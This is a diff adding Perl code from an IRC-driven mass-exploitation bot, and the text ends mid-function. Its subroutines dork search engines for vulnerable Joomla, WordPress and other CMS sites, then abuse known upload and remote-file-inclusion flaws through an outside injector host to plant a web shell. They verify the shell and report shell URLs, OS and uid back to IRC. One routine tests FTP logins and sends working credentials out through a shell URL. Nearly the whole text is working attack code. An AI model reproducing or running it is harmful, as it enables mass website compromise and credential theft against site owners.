+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$jcelogo15$engine 9Finished 15for 9$dork "); }
+ 			my $jceshell = "http://".$site."images/stories/3xp.php";
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+ 			my $cek  = &get_content($jceshell);
+ 			if ($cek =~ /GIF89GHZ/) {
+ 			if ($cek =~ m/<\/title>(.*?)<form action/g) {$safe = $1;}
+ 			
+				&msg("$chan","$jcelogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (OS=$safe) ");
+				&msg("$nama","$jcelogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $jceshell15 (OS=$safe) ");
+	
+ 			}
+
+			} exit; }
+		}
+	}
+}
+
+sub ftp() {
+	my $host = $_[0];
+	my $user = $_[1];
+	my $pass = $_[2];
+	my $chan = $_[3];
+		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+			my $success = 1;
+			use Net::FTP;
+			my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 5);
+			$success = 0 if $ftp->login($user,$pass);
+			$ftp->quit;
+			if ($success == 0) {
+			my $sent = "http://".$site."images/stories/kliverz.php?cpanel&site=".$site."?user=".$user."?pass=".$pass;
+			&get_content($sent);
+				&msg("$admin","4,1 [8FTP4] [ 8host : ".$host." 4] [ 8login : ".$user." 4] [ 8pass : ".$pass." 4] 8Success ");
+				&msg("$chan","4,1 [8FTP4] Found on 8http://$host ");
+			}
+		} exit;
+	}
+}
+sub photostore_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$photostorelogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$photostorelogo15$engine 9Finished 15for 9$dork "); }
+my $photostore = "http://".$site.$bug;
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $cxshell = "http://".$site."/kliverz.php";
+
+my $cek  = &get_content($photostore);sleep(1);
+my $explo = $rceinjector."?url=".$site."&type=photostore";
+&get_content($explo);sleep(1);
+my $check = &get_content($cxshell);sleep(1);
+
+if ($check =~ /Indramayu CyBer/i){
+				my $safe = ""; my $os = ""; my $uid = "";
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$photostorelogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$photostorelogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $cxshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+}
+
+			} exit; }
+		}
+	}
+}
+sub elemin_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$eleminlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$eleminlogo15$engine 9Finished 15for 9$dork "); }
+my $elemin = "http://".$site.$bug;
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $cxshell = "http://".$site."/wp-content/themes/elemin/uploads/kliverz.php";
+
+#my $cek  = &get_content($elemin);sleep(1);
+#				if ($cek =~ /No files were uploaded/i){
+#					&msg("$chan","$eleminlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $explo = $rceinjector."?url=".$site."&type=elemin";
+&get_content($explo);sleep(1);
+my $check = &get_content($cxshell);sleep(1);
+
+if ($check =~ /Indramayu CyBer/i){
+				my $safe = ""; my $os = ""; my $uid = "";
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$eleminlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$eleminlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $cxshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+}
+#}
+			} exit; }
+		}
+	}
+}
+sub joomleague_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$joomleaguelogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$joomleaguelogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $joomleagueshell = "http://".$site."/components/com_joomleague/assets/classes/tmp-upload-images/kliverz.php";
+
+my $joomleagues = "http://".$site."/components/com_joomleague/assets/classes/open-flash-chart/ofc_upload_image.php";
+my $cek  = &get_content($joomleagues);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$joomleaguelogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=joomleague";
+
+my $cekk = &get_content($type);
+$check = &get_content($joomleagueshell."?kliverz");
+&get_content($joomleagueshell."?delete");
+&get_content($joomleagueshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/i) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$joomleaguelogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$joomleaguelogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $joomleagueshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub pointofsale_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$pointofsalelogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$pointofsalelogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $pointofsaleshell = "http://".$site."/application/libraries/tmp-upload-images/kliverz.php";
+
+my $pointofsales = "http://".$site."/application/libraries/ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($pointofsales);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$pointofsalelogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=pointofsale";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($pointofsaleshell."?kliverz");
+&get_content($pointofsaleshell."?delete");
+&get_content($pointofsaleshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {
+				&get_content($pointofsaleshell."?shell");
+				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$pointofsalelogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$pointofsalelogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $pointofsaleshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub clipbucket_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$clipbucketlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$clipbucketlogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $clipbucketshell = "http://".$site."/admin_area/charts/tmp-upload-images/kliverz.php";
+
+my $clipbuckets = "http://".$site."/admin_area/charts/ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($clipbuckets);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$clipbucketlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=clipbucket";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($clipbucketshell."?kliverz");
+&get_content($clipbucketshell."?delete");
+&get_content($clipbucketshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$clipbucketlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$clipbucketlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $clipbucketshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub redmistyc_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$redmistyclogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$redmistyclogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $redmistycshell = "http://".$site."/administrator/components/com_redmystic/chart/tmp-upload-images/kliverz.php";
+
+my $redmistycs = "http://".$site."/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($redmistycs);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$redmistyclogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=redmistyc";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($redmistycshell."?kliverz");
+&get_content($redmistycshell."?delete");
+&get_content($redmistycshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$redmistyclogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$redmistyclogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $redmistycshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+
+sub rfi_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$rfilogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$rfilogo15$engine 9Finished 15for 9$dork "); }
+			my $nama = $simpan;
+			my $coba = "http://".$site.$bug."test???";
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+				my $cek  = &get_content($coba);sleep(1);
+				my $test = "http://".$site.$bug.$rfiinjector."???";
+				
+				if ($cek =~ /failed to open stream/) {
+					my $check = &get_content($test);sleep(1);
+				if ($check =~ /Indramayu CyBer/i) {
+				my $safe = ""; my $os = ""; my $uid = "";	
+				
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$rfilogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$rfilogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $test15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+                   }
+				} exit;
+			}
+		}
+	}
+}	
+}
+sub reflex_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$reflexlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$reflexlogo15$engine 9Finished 15for 9$dork "); }
+my $reflex = "http://".$site.$bug;
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $cxshell = "http://".$site."/wp-content/uploads/kliverz.php";
+
+my $cek  = &get_content($reflex);sleep(1);
+				if ($cek =~ /No files were uploaded/i){
+					&msg("$chan","$reflexlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $explo = $rceinjector."?url=".$site."&type=ref";
+&get_content($explo);sleep(1);
+my $check = &get_content($cxshell);sleep(1);
+
+if ($check =~ /Indramayu CyBer/i){
+				my $safe = ""; my $os = ""; my $uid = "";
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$reflexlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$reflexlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $cxshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+}
+}
+			} exit; }
+		}
+	}
+}
+
+sub switchblade_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$switchbladelogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$switchbladelogo15$engine 9Finished 15for 9$dork "); }
+my $switchblade = "http://".$site.$bug;
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $cxshell = "http://".$site."/wp-content/uploads/2014/1/kliverz.php";
+
+my $cek  = &get_content($switchblade);sleep(1);
+				if ($cek =~ /No files were uploaded/i){
+					&msg("$chan","$switchbladelogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $explo = $rceinjector."?url=".$site."&type=switchblade";
+&get_content($explo);sleep(1);
+my $check = &get_content($cxshell);sleep(1);
+
+if ($check =~ /Indramayu CyBer/i){
+				my $safe = ""; my $os = ""; my $uid = "";
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$switchbladelogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$switchbladelogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $cxshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+}
+}
+			} exit; }
+		}
+	}
+}
+
+sub coldfusion_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$coldfusionlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$coldfusionlogo15$engine 9Finished 15for 9$dork "); }
+my $coldfusion = "http://".$site.$bug;
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $cxshell = "http://".$site."/wp-content/uploads/settingsimages/kliverz.php";
+
+my $cek  = &get_content($coldfusion);sleep(1);
+				if ($cek =~ /No files were uploaded/i){
+					&msg("$chan","$coldfusionlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $explo = $rceinjector."?url=".$site."&type=coldfusion";
+&get_content($explo);sleep(1);
+my $check = &get_content($cxshell);sleep(1);
+
+if ($check =~ /Indramayu CyBer/i){
+				my $safe = ""; my $os = ""; my $uid = "";
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$coldfusionlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$coldfusionlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $cxshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+}
+}
+			} exit; }
+		}
+	}
+}
+
+sub phpvms_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$phpvmslogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$phpvmslogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $phpvmsshell = "http://".$site."/core/lib/tmp-upload-images/kliverz.php";
+
+my $phpvmss = "http://".$site."/core/lib/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($phpvmss);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$phpvmslogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $phpvmsv = "http://wibo.pl/administrator/components/components/rcex.php?url=";
+my $type = $rceinjector."?url=".$site."&type=phpvms";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($phpvmsshell."?kliverz");
+&get_content($phpvmsshell."?delete");
+&get_content($phpvmsshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$phpvmslogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$phpvmslogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $phpvmsshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub maian_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$maianlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$maianlogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $maianshell = "http://".$site."/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/kliverz.php";
+
+my $maians = "http://".$site."/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($maians);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$maianlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=maian";
+
+
+my $cekk = get_content($type);
+$check = &get_content($maianshell."?kliverz");
+&get_content($maianshell."?delete");
+&get_content($maianshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$maianlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$maianlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $maianshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+
+}
+			} exit; }
+		}
+	}
+}
+sub letter_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$letterlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$letterlogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $lettershell = "http://".$site."/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/kliverz.php";
+
+my $letters = "http://".$site."/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($letters);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$letterlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $letterv = "http://wibo.pl/administrator/components/components/rcex.php?url=";
+my $type = $rceinjector."?url=".$site."&type=letter";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($lettershell."?kliverz");
+&get_content($lettershell."?delete");
+&get_content($lettershell."?botnet");
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$letterlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$letterlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $lettershell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+
+}
+			} exit; }
+		}
+	}
+}
+
+sub civicrm_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$civicrmlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$civicrmlogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $civicrmshell = "http://".$site."/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/kliverz.php";
+
+my $civicrms = "http://".$site."/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($civicrms);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$civicrmlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=civi";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($civicrmshell."?kliverz");
+&get_content($civicrmshell."?delete");
+&get_content($civicrmshell."?botnet");
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$civicrmlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$civicrmlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $civicrmshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+
+}
+			} exit; }
+		}
+	}
+}
+sub livecart_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$livecartlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$livecartlogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $livecartshell = "http://".$site."/library/tmp-upload-images/kliverz.php";
+
+my $livecarts = "http://".$site."/library/openFlashChart/ofc_upload_image.php";
+my $cek  = &get_content($livecarts);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$livecartlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=livecart";
+
+my $cekk = &get_content($type);
+$check = &get_content($livecartshell."?kliverz");
+&get_content($livecartshell."?delete");
+&get_content($livecartshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/i) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$livecartlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$livecartlogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $livecartshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub maian15_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$maian15logo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$maian15logo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $maian15shell = "http://".$site."/administrator/components/com_maian15/charts/tmp-upload-images/kliverz.php";
+
+my $maian15s = "http://".$site."/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($maian15s);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$maian15logo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
